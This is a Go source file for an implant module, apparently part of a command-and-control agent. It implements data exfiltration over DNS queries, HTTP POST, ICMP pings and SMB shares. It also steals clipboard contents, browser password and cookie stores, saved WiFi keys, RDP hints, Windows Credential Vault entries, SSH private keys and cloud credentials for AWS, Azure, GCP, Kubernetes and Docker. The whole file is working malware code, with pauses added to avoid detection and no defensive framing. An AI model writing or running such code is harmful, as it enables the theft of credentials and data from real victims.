package implant

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// ══════════════════════════════════════════
//  DATA EXFILTRATION TECHNIQUES
// ══════════════════════════════════════════

func ExecuteExfil(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte(`Exfiltration Commands:
  exfil dns <file> <domain>              Exfil via DNS TXT queries (slow, stealthy)
  exfil http <file> <url>                Exfil via HTTP POST (fast)
  exfil icmp <file> <target>             Exfil via ICMP echo data (no TCP/UDP)
  exfil smb <file> <share>               Exfil via SMB file copy
  exfil clipboard                        Steal current clipboard contents
  exfil browser                          Extract browser passwords/cookies/history
  exfil wifi                             Dump saved WiFi passwords
  exfil rdp                              Extract saved RDP credentials
  exfil vault                            Dump Windows Credential Vault
  exfil ssh-keys                         Find and exfil SSH private keys
  exfil cloud-keys                       Search for AWS/Azure/GCP credentials
  exfil compress <dir> <output>          Compress directory for exfil`), nil
	}

	method := strings.ToLower(args[0])
	switch method {
	case "dns":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: exfil dns <file> <domain>")
		}
		return exfilDNS(args[1], args[2])
	case "http":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: exfil http <file> <url>")
		}
		return exfilHTTP(args[1], args[2])
	case "icmp":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: exfil icmp <file> <target>")
		}
		return exfilICMP(args[1], args[2])
	case "smb":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: exfil smb <file> <share_path>")
		}
		return exfilSMB(args[1], args[2])
	case "clipboard":
		return exfilClipboard()
	case "browser":
		return exfilBrowser()
	case "wifi":
		return exfilWiFi()
	case "rdp":
		return exfilRDP()
	case "vault":
		return exfilVault()
	case "ssh-keys":
		return exfilSSHKeys()
	case "cloud-keys":
		return exfilCloudKeys()
	case "compress":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: exfil compress <directory> <output.tar.gz>")
		}
		return exfilCompress(args[1], args[2])
	default:
		return nil, fmt.Errorf("unknown exfil method: %s", method)
	}
}

// DNS exfiltration — encode file data as DNS subdomain queries
func exfilDNS(filePath, domain string) ([]byte, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	encoded := hex.EncodeToString(data)
	chunkSize := 60 // Max subdomain label length
	chunks := 0

	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunk := encoded[i:end]
		query := fmt.Sprintf("%s.%d.%s", chunk, chunks, domain)
		net.LookupHost(query) // DNS query carries the data
		chunks++
		time.Sleep(100 * time.Millisecond) // Avoid detection
	}

	return []byte(fmt.Sprintf("[+] DNS exfil complete: %s → %s (%d chunks, %d bytes)", filePath, domain, chunks, len(data))), nil
}

// HTTP POST exfiltration
func exfilHTTP(filePath, url string) ([]byte, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	resp, err := http.Post(url, "application/octet-stream", strings.NewReader(encoded))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return []byte(fmt.Sprintf("[+] HTTP exfil complete: %s → %s (%d bytes, HTTP %d)", filePath, url, len(data), resp.StatusCode)), nil
}

// ICMP exfiltration — embed data in ping packets
func exfilICMP(filePath, target string) ([]byte, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	// Use ping command with data in padding
	chunkSize := 32
	chunks := 0
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		// Ping with encoded data as pattern
		pattern := hex.EncodeToString(data[i:end])
		ExecuteShell([]string{fmt.Sprintf("ping -c 1 -p %s %s 2>/dev/null || ping -n 1 -l %d %s >nul 2>&1", pattern[:16], target, len(data[i:end]), target)})
		chunks++
		time.Sleep(200 * time.Millisecond)
	}

	return []byte(fmt.Sprintf("[+] ICMP exfil complete: %s → %s (%d chunks)", filePath, target, chunks)), nil
}

// SMB exfiltration — copy to network share
func exfilSMB(filePath, sharePath string) ([]byte, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	destPath := filepath.Join(sharePath, filepath.Base(filePath))
	if err := os.WriteFile(destPath, data, 0644); err != nil {
		// Try copy command
		out, err2 := ExecuteShell([]string{fmt.Sprintf("copy \"%s\" \"%s\" /Y", filePath, destPath)})
		if err2 != nil {
			return nil, fmt.Errorf("SMB copy failed: %v", err)
		}
		return append([]byte(fmt.Sprintf("[+] SMB exfil via copy: %s → %s\n", filePath, destPath)), out...), nil
	}

	return []byte(fmt.Sprintf("[+] SMB exfil complete: %s → %s (%d bytes)", filePath, destPath, len(data))), nil
}

// Clipboard steal
func exfilClipboard() ([]byte, error) {
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = executePowerShell("Get-Clipboard")
	} else {
		out, err = ExecuteShell([]string{"xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || echo '[no clipboard access]'"})
	}
	if err != nil || len(out) == 0 {
		return []byte("[-] Clipboard access failed"), nil
	}
	return append([]byte("[+] Clipboard contents:\n"), out...), nil
}

// Browser credential extraction
func exfilBrowser() ([]byte, error) {
	var results []string
	results = append(results, "[*] Searching for browser data...")

	// Chrome
	paths := []string{
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`,
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`,
		`%LOCALAPPDATA%\Google\Chrome\User Data\Default\History`,
		`~/.config/google-chrome/Default/Login Data`,
		`~/.config/google-chrome/Default/Cookies`,
	}

	for _, p := range paths {
		expanded := os.ExpandEnv(p)
		if _, err := os.Stat(expanded); err == nil {
			info, _ := os.Stat(expanded)
			results = append(results, fmt.Sprintf("[+] Found: %s (%d bytes)", expanded, info.Size()))
		}
	}

	// Firefox
	ffPaths := []string{
		`%APPDATA%\Mozilla\Firefox\Profiles`,
		`~/.mozilla/firefox`,
	}
	for _, p := range ffPaths {
		expanded := os.ExpandEnv(p)
		if _, err := os.Stat(expanded); err == nil {
			results = append(results, fmt.Sprintf("[+] Firefox profiles: %s", expanded))
		}
	}

	if len(results) == 1 {
		results = append(results, "[-] No browser data found")
	}

	return []byte(strings.Join(results, "\n")), nil
}

// WiFi password extraction
func exfilWiFi() ([]byte, error) {
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = executePowerShell(`$profiles = netsh wlan show profiles 2>$null; if ($profiles) { $profiles | ForEach-Object { if ($_ -match ':\s+(.+)$') { $p = $Matches[1].Trim(); $detail = netsh wlan show profile name="$p" key=clear 2>$null; $key = ($detail | Where-Object { $_ -match 'Key Content' }) -replace '.*:\s+',''; if ($key) { "$p : $key" } else { "$p : (no password)" } } } } else { 'No WiFi profiles found' }`)
	} else {
		out, err = ExecuteShell([]string{`nmcli -s -g 802-11-wireless-security.psk connection show 2>/dev/null || grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null || echo "No WiFi passwords found"`})
	}
	if err != nil {
		return []byte("[-] WiFi password extraction failed"), nil
	}
	return append([]byte("[+] WiFi Passwords:\n"), out...), nil
}

// RDP saved credentials
func exfilRDP() ([]byte, error) {
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = executePowerShell(`$servers = Get-ChildItem 'HKCU:\Software\Microsoft\Terminal Server Client\Servers' -EA SilentlyContinue; if ($servers) { foreach ($s in $servers) { $s.PSChildName + ' : ' + $s.GetValue('UsernameHint') } } else { 'No saved RDP credentials found' }`)
	} else {
		out, err = ExecuteShell([]string{`find ~/.config/freerdp ~/.config/remmina -type f 2>/dev/null | head -20 || echo "No RDP client configs found"`})
	}
	if err != nil {
		return []byte("[-] RDP credential extraction failed"), nil
	}
	return append([]byte("[+] Saved RDP Credentials:\n"), out...), nil
}

// Windows Credential Vault
func exfilVault() ([]byte, error) {
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = ExecuteShell([]string{`cmdkey /list 2>nul & echo --- & vaultcmd /listcreds:"Windows Credentials" /all 2>nul`})
	} else {
		out, err = ExecuteShell([]string{`echo "Windows Credential Vault is a Windows-only feature"`})
	}
	if err != nil {
		return []byte("[-] Vault extraction failed"), nil
	}
	return append([]byte("[+] Credential Vault:\n"), out...), nil
}

// SSH key extraction
func exfilSSHKeys() ([]byte, error) {
	var results []string
	results = append(results, "[*] Searching for SSH private keys...")

	searchPaths := []string{
		os.ExpandEnv("$HOME/.ssh"),
		os.ExpandEnv("$USERPROFILE/.ssh"),
		"/root/.ssh",
		"C:\\Users",
	}

	for _, dir := range searchPaths {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info == nil || info.IsDir() {
				return nil
			}
			name := info.Name()
			if name == "id_rsa" || name == "id_ecdsa" || name == "id_ed25519" || strings.HasSuffix(name, ".pem") || strings.HasSuffix(name, ".key") {
				results = append(results, fmt.Sprintf("[+] SSH Key: %s (%d bytes)", path, info.Size()))
			}
			return nil
		})
	}

	return []byte(strings.Join(results, "\n")), nil
}

// Cloud credential extraction
func exfilCloudKeys() ([]byte, error) {
	var results []string
	results = append(results, "[*] Searching for cloud credentials...")

	searchFiles := map[string]string{
		os.ExpandEnv("$HOME/.aws/credentials"):          "AWS Credentials",
		os.ExpandEnv("$USERPROFILE/.aws/credentials"):   "AWS Credentials",
		os.ExpandEnv("$HOME/.azure/accessTokens.json"):  "Azure Tokens",
		os.ExpandEnv("$HOME/.config/gcloud/credentials.db"): "GCP Credentials",
		os.ExpandEnv("$HOME/.kube/config"):               "Kubernetes Config",
		os.ExpandEnv("$HOME/.docker/config.json"):        "Docker Registry Auth",
	}

	for path, desc := range searchFiles {
		if info, err := os.Stat(path); err == nil {
			results = append(results, fmt.Sprintf("[+] %s: %s (%d bytes)", desc, path, info.Size()))
			// Read first few lines
			data, _ := os.ReadFile(path)
			if len(data) > 200 {
				data = data[:200]
			}
			results = append(results, fmt.Sprintf("    Preview: %s...", strings.ReplaceAll(string(data), "\n", "\\n")))
		}
	}

	// Search for .env files
	envPaths := []string{".", "..", "/var/www", "/opt", os.ExpandEnv("$HOME")}
	for _, dir := range envPaths {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info == nil || info.IsDir() {
				return nil
			}
			if info.Name() == ".env" || info.Name() == "credentials.json" || info.Name() == "secrets.yaml" {
				results = append(results, fmt.Sprintf("[+] Sensitive file: %s (%d bytes)", path, info.Size()))
			}
			return filepath.SkipDir // Don't recurse too deep
		})
	}

	return []byte(strings.Join(results, "\n")), nil
}

// Compress directory for exfiltration
func exfilCompress(dir, output string) ([]byte, error) {
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = executePowerShell(fmt.Sprintf("Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force", dir, output))
	} else {
		out, err = ExecuteShell([]string{fmt.Sprintf("tar czf %s -C %s . 2>/dev/null", output, dir)})
	}
	if err != nil {
		return nil, err
	}

	info, _ := os.Stat(output)
	size := "unknown"
	if info != nil {
		size = fmt.Sprintf("%d bytes", info.Size())
	}

	return append([]byte(fmt.Sprintf("[+] Compressed: %s → %s (%s)\n", dir, output, size)), out...), nil
}
